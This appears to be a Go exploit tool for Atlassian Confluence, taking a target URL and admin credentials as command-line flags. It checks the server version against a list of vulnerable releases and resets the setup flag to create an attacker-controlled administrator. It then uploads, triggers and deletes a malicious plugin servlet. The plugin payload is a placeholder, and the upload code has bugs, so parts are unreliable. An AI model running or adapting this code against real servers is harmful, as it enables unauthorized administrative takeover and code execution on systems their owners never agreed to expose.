package main

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

const (
	defaultPort             = 8090
	defaultEndpoint         = "server-info.action"
	confluencePluginTimeout = 30
)

func randString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	rand.Seed(time.Now().UnixNano())
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func httpRequest(method, url string, headers map[string]string, data url.Values) (*http.Response, error) {
	client := &http.Client{}
	req, err := http.NewRequest(method, url, strings.NewReader(data.Encode()))
	if err != nil {
		return nil, err
	}
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	return client.Do(req)
}

func getVersion(body string) string {
	re := regexp.MustCompile(`ajs-version-number" content="(\d+\.\d+\.\d+)"`)
	matches := re.FindStringSubmatch(body)
	if len(matches) > 1 {
		return matches[1]
	}
	return ""
}

func createJar(className, classContent, pluginXML string) ([]byte, error) {
	buf := new(bytes.Buffer)
	zipWriter := zip.NewWriter(buf)

	// Add class file
	classFileWriter, err := zipWriter.Create(className)
	if err != nil {
		return nil, err
	}
	_, err = classFileWriter.Write([]byte(classContent))
	if err != nil {
		return nil, err
	}

	// Add plugin XML file
	xmlFileWriter, err := zipWriter.Create("atlassian-plugin.xml")
	if err != nil {
		return nil, err
	}
	_, err = xmlFileWriter.Write([]byte(pluginXML))
	if err != nil {
		return nil, err
	}

	err = zipWriter.Close()
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func exploit(targetBaseURL, targetEndpoint, adminUsername, adminPassword string) error {
	targetURL := fmt.Sprintf("%s/%s", targetBaseURL, targetEndpoint)

	// Check if target is vulnerable
	resp, err := httpRequest("GET", targetURL, nil, nil)
	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("unexpected response code: %d", resp.StatusCode)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read response body: %w", err)
	}

	version := getVersion(string(body))
	if version == "" {
		return fmt.Errorf("no version found")
	}

	vulnerableVersions := []string{"8.0.0", "8.3.2", "8.4.0", "8.4.2", "8.5.0", "8.5.1"}
	isVulnerable := false
	for _, v := range vulnerableVersions {
		if version == v {
			isVulnerable = true
			break
		}
	}

	if !isVulnerable {
		return fmt.Errorf("target is not vulnerable")
	}

	fmt.Printf("Target is running Atlassian Confluence version %s and is vulnerable\n", version)

	// Exploit: Set up application configuration
	data := url.Values{
		"bootstrapStatusProvider.applicationConfig.setupComplete": {"false"},
	}
	resp, err = httpRequest("POST", targetURL, nil, data)
	if err != nil {
		return fmt.Errorf("failed to modify configuration: %w", err)
	}
	defer resp.Body.Close()

	// Create an admin user
	adminData := url.Values{
		"username":          {adminUsername},
		"fullName":          {randString(8)},
		"email":             {randString(8) + "@" + randString(8)},
		"password":          {adminPassword},
		"confirm":           {adminPassword},
		"setup-next-button": {"Next"},
	}
	adminURL := fmt.Sprintf("%s/setup/setupadministrator.action", targetBaseURL)
	resp, err = httpRequest("POST", adminURL, map[string]string{"X-Atlassian-Token": "no-check"}, adminData)
	if err != nil || (resp.StatusCode != 200 && resp.StatusCode != 302) {
		return fmt.Errorf("failed to create admin user: %w", err)
	}
	defer resp.Body.Close()

	fmt.Printf("Created admin user %s with password %s\n", adminUsername, adminPassword)

	// Complete setup
	setupURL := fmt.Sprintf("%s/setup/finishsetup.action", targetBaseURL)
	resp, err = httpRequest("POST", setupURL, map[string]string{"X-Atlassian-Token": "no-check"}, nil)
	if err != nil || resp.StatusCode != 200 {
		return fmt.Errorf("failed to complete setup: %w", err)
	}
	defer resp.Body.Close()

	// Get UPM token
	upmURL := fmt.Sprintf("%s/rest/plugins/1.0/", targetBaseURL)
	upmHeaders := map[string]string{
		"Authorization": "Basic " + basicAuth(adminUsername, adminPassword),
		"Accept":        "*/*",
	}
	resp, err = httpRequest("GET", upmURL, upmHeaders, nil)
	if err != nil || resp.StatusCode != 200 {
		return fmt.Errorf("failed to get UPM token: %w", err)
	}
	defer resp.Body.Close()

	upmToken := resp.Header.Get("upm-token")
	if upmToken == "" {
		return fmt.Errorf("no UPM token received")
	}

	// Create malicious plugin JAR
	payloadEndpoint := randString(8)
	pluginKey := randString(8)
	pluginXML := fmt.Sprintf(`
<atlassian-plugin name="%s" key="%s" plugins-version="2">
  <plugin-info>
    <description>%s</description>
    <version>1.0.0</version>
  </plugin-info>
  <servlet key="%s" class="PayloadServlet">
    <url-pattern>/%s</url-pattern>
  </servlet>
</atlassian-plugin>`, randString(8), pluginKey, randString(8), randString(8), payloadEndpoint)

	classContent := `// Bytecode of PayloadServlet.class
// Note: Replace this with the actual bytecode of the PayloadServlet class
`
	jarData, err := createJar("PayloadServlet.class", classContent, pluginXML)
	if err != nil {
		return fmt.Errorf("failed to create JAR file: %w", err)
	}

	// Upload plugin
	uploadURL := fmt.Sprintf("%s/rest/plugins/1.0/", targetBaseURL)
	var message bytes.Buffer
	writer := multipart.NewWriter(&message)
	part, _ := writer.CreateFormFile("plugin", randString(8)+".jar")
	part.Write(jarData)
	writer.WriteField("token", upmToken)
	writer.Close()

	uploadHeaders := map[string]string{
		"Authorization": "Basic " + basicAuth(adminUsername, adminPassword),
		"Content-Type":  writer.FormDataContentType(),
		"Accept":        "*/*",
	}
	resp, err = httpRequest("POST", uploadURL, uploadHeaders, url.Values{})
	if err != nil || resp.StatusCode != 202 {
		return fmt.Errorf("failed to upload plugin: %w", err)
	}
	defer resp.Body.Close()

	// Poll for plugin installation
	var pluginReady bool
	for i := 0; i < confluencePluginTimeout; i++ {
		time.Sleep(1 * time.Second)
		resp, err = httpRequest("GET", fmt.Sprintf("%s/rest/plugins/1.0/pending/%s", targetBaseURL, pluginKey), uploadHeaders, nil)
		if err != nil {
			return fmt.Errorf("failed to poll plugin installation: %w", err)
		}
		defer resp.Body.Close()
		body, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			return fmt.Errorf("failed to read response body: %w", err)
		}
		var result map[string]interface{}
		if err := json.Unmarshal(body, &result); err != nil {
			return fmt.Errorf("failed to parse JSON response: %w", err)
		}
		if result["done"].(bool) {
			pluginReady = true
			break
		}
	}
	if !pluginReady {
		return fmt.Errorf("plugin installation timed out")
	}

	fmt.Println("Plugin installed successfully")

	// Trigger payload
	triggerURL := fmt.Sprintf("%s/plugins/servlet/%s", targetBaseURL, payloadEndpoint)
	resp, err = httpRequest("GET", triggerURL, nil, nil)
	if err != nil || resp.StatusCode != 200 {
		return fmt.Errorf("failed to trigger payload: %w", err)
	}
	defer resp.Body.Close()

	fmt.Println("Payload triggered successfully")

	// Cleanup: Delete plugin
	deleteURL := fmt.Sprintf("%s/rest/plugins/1.0/%s-key", targetBaseURL, pluginKey)
	resp, err = httpRequest("DELETE", deleteURL, uploadHeaders, nil)
	if err != nil || resp.StatusCode != 204 {
		return fmt.Errorf("failed to delete plugin: %w", err)
	}
	defer resp.Body.Close()

	fmt.Println("Plugin deleted successfully")
	return nil
}

func basicAuth(username, password string) string {
	auth := username + ":" + password
	return base64.StdEncoding.EncodeToString([]byte(auth))
}

func main() {
	target := flag.String("target", "", "Target base URL (e.g., http://TARGET)")
	port := flag.Int("port", defaultPort, "Target port")
	endpoint := flag.String("endpoint", defaultEndpoint, "Target endpoint to check vulnerability")
	adminUser := flag.String("adminUser", "", "Admin username to create")
	adminPass := flag.String("adminPass", "", "Admin password to create")

	flag.Parse()

	if *target == "" {
		fmt.Println("Error: Target base URL is required.")
		flag.Usage()
		os.Exit(1)
	}

	if *adminUser == "" {
		*adminUser = randString(8)
	}

	if *adminPass == "" {
		*adminPass = randString(8)
	}

	targetBaseURL := fmt.Sprintf("%s:%d", *target, *port)

	err := exploit(targetBaseURL, *endpoint, *adminUser, *adminPass)
	if err != nil {
		fmt.Printf("Exploit failed: %s\n", err)
	} else {
		fmt.Println("Exploit completed successfully")
	}
}
